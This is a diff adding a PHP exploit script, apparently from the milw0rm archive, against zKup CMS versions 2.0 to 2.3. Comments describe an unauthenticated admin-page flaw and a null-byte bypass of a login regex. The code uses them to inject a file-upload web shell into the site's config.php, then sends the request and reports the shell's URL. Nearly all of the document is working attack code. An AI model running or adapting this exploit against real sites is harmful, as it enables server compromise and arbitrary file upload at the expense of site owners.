@@ -1,0 +1,94 @@
+#!/usr/bin/php
+<?php
+/*
+ * Name:    zKup CMS v2.0 <= v2.3 0-day exploit (upload)
+ * Credits: Charles "real" F. <charlesfol[at]hotmail.fr>
+ * Date:    03-08-2008
+ * Conditions: PHP Version, magic_quotes_gpc=Off
+ *
+ * This exploit spawn a php uploader in your victim's
+ * server.
+ *
+ * Okay, you may need explanations:
+ *
+ * First, we can use administration without being admin
+ * (see ./admin/configuration/modifier.php)
+ *
+ * Then, when we add an admin, it is saved in a php file,
+ * named "./fichiers/config.php".
+ * A vuln is present when the script controls $login value,
+ * because it use this regex: #^[a-zA-Z0-9]+$#
+ * in order to see if it's alphanumerical.
+ * I bypassed this regex using a NULL POISON BYTE (%00),
+ * and writing my upload script just after.
+ * I finally put some lines in order not to
+ * corrupt config.php.
+ *
+ */
+
+print "\n";
+print "   zKup CMS v2.0 <= v2.3 0-day exploit (upload)\n";
+print "       by Charles \"real\" F. <charlesfol[at]hotmail.fr>\n\n";
+
+if($argc<2) { print "usage: php zkup2_upload_exploit.php <url>\n   eg: php zkup2_upload_exploit.php http://127.0.0.1/votresite/";exit(-1); }
+$url = $argv[1];
+
+$code = '
+if(isset($_POST[\'upload\']))
+{
+    if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], "./".$_FILES[\'file\'][\'name\'])) exit("<center>Error (move_uploaded_file)</center>");
+    else echo "<center>File uploaded</center>";
+}
+if($_GET[\'up\']==1)
+{
+?>
+<form method="post" enctype="multipart/form-data">
+<center>
+<input type="file" name="file">
+<input type="submit" name="upload" value="Upload">
+</center>
+</form>
+<?php
+}
+';
+$code = urlencode($code);
+
+/* Not to compromise config.php work */
+$restore = array();
+$restore[0] = 'admin'.rand(100,200).'%00","mdp"=>"436ae61e82a236bd4771e184a556bf65","lvl"=>9);';
+$restore[1] = '$tAdmin[] = array("login"=> "admin'.rand(200,300);
+
+$postit = "action=ajout&login=$restore[0]$code$restore[1]&mdp=real&mdp2=real&lvl=9";
+
+print "[*] sending evil c0de ... ";
+if(preg_match("#alert#i",post($url."admin/configuration/modifier.php","$postit"))) print "done.\n[*] upload script: ".$url."fichiers/config.php?up=1\n";
+else print "failed.\n";
+
+function post($url,$data,$get=1)
+{
+	$result = '';
+	preg_match("#^http://([^/]+)(/.*)$#i",$url,$info);
+	$host = $info[1];
+	$page = $info[2];
+	$fp = fsockopen($host, 80, &$errno, &$errstr, 30);
+	
+	$req  = "POST $page HTTP/1.1\r\n";
+	$req .= "Host: $host\r\n";
+	$req .= "User-Agent: Mozilla Firefox\r\n";
+	$req .= "Connection: close\r\n";
+	$req .= "Content-type: application/x-www-form-urlencoded\r\n";
+	$req .= "Content-length: ".strlen( $data )."\r\n";
+	$req .= "\r\n";
+	$req .= $data."\r\n";
+
+	fputs($fp,$req);
+	
+	if($get) while(!feof($fp)) $result .= fgets($fp,128);
+	
+	fclose($fp);
+	return $result;
+}
+
+?>
+
+# milw0rm.com [2008-03-07]
